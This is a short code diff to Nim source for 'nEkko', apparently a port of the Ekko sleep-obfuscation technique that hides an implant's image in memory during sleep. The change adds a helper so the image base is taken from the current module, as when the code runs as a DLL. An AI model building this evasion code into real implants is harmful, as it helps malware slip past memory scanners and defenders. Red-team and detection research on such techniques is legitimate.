@@ -10,6 +10,12 @@ type
         Buffer*: PVOID
 
 
+proc GetCurrentModule(): HMODULE =
+    var hModule: HMODULE
+    GetModuleHandleEx(GET_MODULE_HANDLE_EX_FLAG_FROM_ADDRESS, cast[LPCTSTR](GetCurrentModule), addr hModule)
+    return hModule
+
+
 proc nEkko*(sleepTime: int) = 
     var
         ctxThread: CONTEXT
@@ -24,7 +30,8 @@ proc nEkko*(sleepTime: int) =
         hNewTimer: HANDLE 
         hEvent: HANDLE = CreateEventW(cast[LPSECURITY_ATTRIBUTES](0), cast[WINBOOL](NULL), cast[WINBOOL](NULL), nil)
 
-        imageBase: PVOID = cast[PVOID](GetModuleHandleA(NULL))
+        imageBase: PVOID = cast[PVOID](GetCurrentModule())       # replaced line, gets the current module
+        # imageBase: PVOID = cast[PVOID](GetModuleHandleA(NULL)) # original line, gets the image module
         imageSize: PVOID = cast[PVOID](cast[PIMAGE_NT_HEADERS](imageBase + cast[PIMAGE_DOS_HEADER](imageBase).e_lfanew).OptionalHeader.SizeOfImage)
         oldProtect: DWORD
 
